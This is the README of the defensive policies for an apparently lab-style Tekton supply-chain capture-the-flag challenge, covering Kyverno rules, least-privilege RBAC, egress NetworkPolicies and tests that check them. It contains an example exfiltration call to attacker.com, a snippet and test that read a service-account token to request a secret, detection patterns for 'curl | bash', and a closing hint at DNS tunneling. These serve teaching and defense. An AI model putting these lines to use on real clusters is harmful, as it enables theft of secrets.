# Security Policies for Tekton Supply Chain CTF

This directory contains security policies that **detect and prevent** the Tekton supply chain attack demonstrated in this CTF challenge.

## 📋 Overview

The attack (described in [`ATTACK-ANALYSIS.md`](../ATTACK-ANALYSIS.md)) exploits:
1. **Untrusted code execution** - PR pipelines that run `go run` on attacker's code
2. **Overly privileged ServiceAccounts** - Default SA can read all secrets
3. **No network restrictions** - Malicious code can exfiltrate data to `attacker.com`

This security setup provides **defense in depth** across multiple layers:

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Kyverno Policy Engine (Prevention)                 │
│  ✓ Block dangerous ServiceAccounts                          │
│  ✓ Warn on risky commands (go run, curl|bash)              │
│  ✓ Restrict external Git repositories                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: RBAC (Least Privilege)                             │
│  ✓ pr-pipeline-readonly: NO secret access                   │
│  ✓ main-pipeline: named secrets only                        │
│  ✓ Prevent lateral movement                                 │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 3: Network Policies (Exfiltration Prevention)         │
│  ✓ Block egress to external IPs                             │
│  ✓ Allow only: DNS, K8s API, internal Gitea                 │
│  ✓ Prevent: http.Post("http://attacker.com", secrets)       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 4: Monitoring & Detection (Kubescape, Audicia)        │
│  ✓ Scan for misconfigurations                               │
│  ✓ Detect anomalous secret access                           │
│  ✓ Compliance reporting (NSA, MITRE)                        │
└─────────────────────────────────────────────────────────────┘
```

## 🚀 Quick Start

```bash
# 1. Deploy security tools (Kyverno + Kubescape)
make setup-security-tools

# 2. Apply prevention policies
make apply-prevention-policies

# 3. Run security scans
make security-scan

# 4. Verify everything is working
make verify-security
```

## 📁 Directory Structure

```
security/
├── README.md                          # This file
├── kyverno-policies/                  # Kyverno ClusterPolicies
│   ├── restrict-tekton-serviceaccounts.yaml
│   ├── restrict-external-git-repos.yaml
│   └── block-dangerous-commands.yaml
├── network-policies/                  # Kubernetes NetworkPolicies
│   └── tekton-egress-restriction.yaml
└── rbac/                              # ServiceAccounts and RBAC
    └── minimal-serviceaccounts.yaml
```

## 🛡️ Policy Details

### Kyverno Policies

#### 1. `restrict-tekton-serviceaccounts.yaml`
**Prevents:** Using privileged ServiceAccounts in PR pipelines

**Mode:** `enforce` (blocks non-compliant resources)

**What it blocks:**
- ❌ `serviceAccountName: default` in PipelineRuns
- ❌ `serviceAccountName: pipeline-admin` in PipelineRuns
- ❌ `serviceAccountName: tekton-triggers-sa` in TaskRuns
- ❌ Secret volume mounts in TaskRuns

**Example violation:**
```yaml
apiVersion: tekton.dev/v1
kind: PipelineRun
spec:
  serviceAccountName: default  # ❌ BLOCKED by Kyverno
```

**Fix:**
```yaml
spec:
  serviceAccountName: pr-pipeline-readonly  # ✅ Allowed
```

---

#### 2. `restrict-external-git-repos.yaml`
**Prevents:** Cloning external Git repositories in pipelines

**Mode:** `audit` (warns but doesn't block)

**What it detects:**
- ⚠️ `git-url` containing `github.com`
- ⚠️ `git-url` containing `gitlab.com`
- ⚠️ URLs not matching internal patterns

**Example violation:**
```yaml
params:
- name: git-url
  value: https://github.com/attacker/malicious-repo.git  # ⚠️ WARNED
```

**Fix:**
```yaml
params:
- name: git-url
  value: http://gitea.gitea.svc.cluster.local/ctf/victim-repo.git  # ✅ OK
```

---

#### 3. `block-dangerous-commands.yaml`
**Prevents:** Dangerous command patterns in Tasks

**Mode:** `audit` (warns)

**What it detects:**
- ⚠️ `go run` (executes arbitrary code)
- ⚠️ `./scripts/*` (runs scripts from untrusted repos)
- ⚠️ `curl * | bash` (downloads and executes untrusted code)
- ❌ `privileged: true` containers (enforced)

**Example violation:**
```yaml
steps:
- name: quality-check
  script: |
    go run ./scripts/quality-check/  # ⚠️ DANGEROUS
```

**Safer alternative:**
```yaml
steps:
- name: quality-check
  script: |
    # Build first, then run binary (sandboxed)
    go build -o /tmp/checker ./scripts/quality-check/
    /tmp/checker  # Can still be dangerous without other protections!
```

---

### Network Policies

#### `tekton-egress-restriction.yaml`
**Prevents:** Data exfiltration to external servers

**Applied to:**
- `tekton-pipelines` namespace
- `ctf-challenge` namespace

**Allowed egress:**
- ✅ DNS resolution (kube-system:53)
- ✅ Kubernetes API server (port 443)
- ✅ Internal Gitea (gitea namespace:3000,22)
- ✅ Same namespace communication

**Blocked egress:**
- ❌ `http://attacker.com` (or any external IP)
- ❌ `https://pastebin.com`
- ❌ Cryptocurrency mining pools
- ❌ Command & Control servers

**How it prevents the attack:**
```go
// This code will FAIL with network timeout
http.Post("http://attacker.com/loot", secretData)
// Error: dial tcp: i/o timeout (blocked by NetworkPolicy)
```

---

### RBAC Configurations

#### `minimal-serviceaccounts.yaml`

**ServiceAccounts created:**

1. **`pr-pipeline-readonly`** (for untrusted PR pipelines)
   - ✅ Can: Read ConfigMaps, list PipelineRuns
   - ❌ Cannot: Read secrets, create pods, modify resources

2. **`main-pipeline`** (for trusted main branch pipelines)
   - ✅ Can: Read specific named secrets, create deployments
   - ❌ Cannot: Read all secrets (only named ones)

3. **`security-auditor`** (for monitoring tools)
   - ✅ Can: Read all resource types cluster-wide
   - ❌ Cannot: Modify resources

**How it prevents the attack:**
```go
// Running with pr-pipeline-readonly ServiceAccount:
token := readFile("/var/run/secrets/kubernetes.io/serviceaccount/token")

// This API call will return 403 Forbidden
resp := httpGet(
    "https://kubernetes.default.svc/api/v1/namespaces/ctf-challenge/secrets/ctf-flag",
    "Bearer " + token
)
// Error: secrets "ctf-flag" is forbidden: User "system:serviceaccount:ctf-challenge:pr-pipeline-readonly"
//        cannot get resource "secrets" in API group "" in the namespace "ctf-challenge"
```

---

## 🧪 Testing the Defenses

### Test 1: Verify Kyverno blocks dangerous ServiceAccounts

```bash
# This should be REJECTED by Kyverno
cat <<EOF | kubectl apply -f -
apiVersion: tekton.dev/v1
kind: PipelineRun
metadata:
  name: test-default-sa
  namespace: ctf-challenge
spec:
  pipelineRef:
    name: pr-quality-check-pipeline
  serviceAccountName: default  # Should be blocked!
  params:
  - name: pr-repo-url
    value: http://gitea.gitea.svc.cluster.local/ctf/victim-repo.git
EOF

# Expected output:
# Error from server: admission webhook "validate.kyverno.svc" denied the request
```

### Test 2: Verify RBAC blocks secret access

```bash
# Create a pod using pr-pipeline-readonly SA
kubectl run -n ctf-challenge test-rbac \
  --image=curlimages/curl:latest \
  --serviceaccount=pr-pipeline-readonly \
  --rm -it --restart=Never -- sh

# Inside the pod, try to access secrets:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  https://kubernetes.default.svc/api/v1/namespaces/ctf-challenge/secrets/ctf-flag

# Expected output:
# {
#   "kind": "Status",
#   "status": "Failure",
#   "message": "secrets \"ctf-flag\" is forbidden",
#   "reason": "Forbidden",
#   "code": 403
# }
```

### Test 3: Verify Network Policy blocks exfiltration

```bash
# Create a pod in ctf-challenge namespace
kubectl run -n ctf-challenge test-netpol \
  --image=curlimages/curl:latest \
  --rm -it --restart=Never -- sh

# Inside the pod, try to access external server:
curl -m 5 http://google.com

# Expected output:
# curl: (28) Connection timed out after 5000 milliseconds

# But internal Gitea should work:
curl -m 5 http://gitea.gitea.svc.cluster.local:3000

# Expected output:
# <!DOCTYPE html>... (Gitea homepage HTML)
```

---

## 📊 Monitoring & Detection

### Kubescape Scanning

```bash
# Scan Tekton resources for security issues
make security-scan

# Review the report
cat kubescape-report.txt
```

**What Kubescape detects:**
- Excessive RBAC permissions
- Missing network policies
- Privileged containers
- Exposed secrets in environment variables
- Non-compliant configurations (NSA, MITRE frameworks)

### Audicia.io Integration

If you have access to Audicia.io:

1. **Configure audit log collection:**
```bash
# Enable audit logging in KinD cluster
# (requires cluster recreation with audit policy)
```

2. **Detect anomalous secret access:**
```
ServiceAccount 'default' in namespace 'ctf-challenge'
accessed secret 'ctf-flag' - UNUSUAL for CI pipelines
```

3. **Generate minimal RBAC:**
```bash
# Audicia analyzes actual usage and suggests minimal permissions
audicia analyze --namespace ctf-challenge --output minimal-rbac.yaml
```

---

## 🔧 Customization

### Change Policy Enforcement

To make policies more strict:

```bash
# Edit Kyverno policy
kubectl edit clusterpolicy restrict-external-git-repositories

# Change: validationFailureAction: audit
# To:     validationFailureAction: enforce
```

### Allow Specific External Repositories

```yaml
# Add to restrict-external-git-repos.yaml
rules:
- name: allow-trusted-external-repo
  match:
    any:
    - resources:
        kinds:
        - PipelineRun
  validate:
    message: "Allowed: This is a trusted external repository"
    pattern:
      spec:
        params:
        - name: git-url
          value: "https://github.com/trusted-org/trusted-repo.git"
```

### Add More Allowed Egress Destinations

```yaml
# Add to network-policies/tekton-egress-restriction.yaml
egress:
# Allow communication with internal artifact registry
- to:
  - namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: artifact-registry
  ports:
  - port: 5000
    protocol: TCP
```

---

## 📚 Best Practices

1. **Use separate ServiceAccounts for different trust levels:**
   - PR pipelines → `pr-pipeline-readonly`
   - Main branch → `main-pipeline`
   - Production deployments → Separate SA with minimal permissions

2. **Apply Network Policies to ALL namespaces:**
   ```bash
   for ns in $(kubectl get ns -o name | cut -d/ -f2); do
     kubectl apply -f security/network-policies/tekton-egress-restriction.yaml -n $ns
   done
   ```

3. **Regularly scan for misconfigurations:**
   ```bash
   # Add to CI/CD pipeline
   make security-scan
   ```

4. **Monitor audit logs for anomalies:**
   - Use Audicia.io or similar tools
   - Alert on unexpected secret access
   - Review ServiceAccount usage patterns

5. **Test policies in `audit` mode first:**
   - Ensure policies don't break legitimate workflows
   - Switch to `enforce` after validation

---

## 🎯 CTF Challenge: Breaking the Defenses

**Challenge for participants:**

Even with all these defenses in place, can you find a way to:
1. Exfiltrate the flag without network egress?
2. Bypass RBAC restrictions?
3. Find misconfigurations in the policies?

Hint: Look for DNS tunneling, timing attacks, or legitimate channels that aren't blocked!

---

## 🔗 Related Resources

- [ATTACK-ANALYSIS.md](../ATTACK-ANALYSIS.md) - Detailed attack comparison
- [StepSecurity Blog Post](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [Kyverno Documentation](https://kyverno.io/docs/)
- [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [RBAC Best Practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)
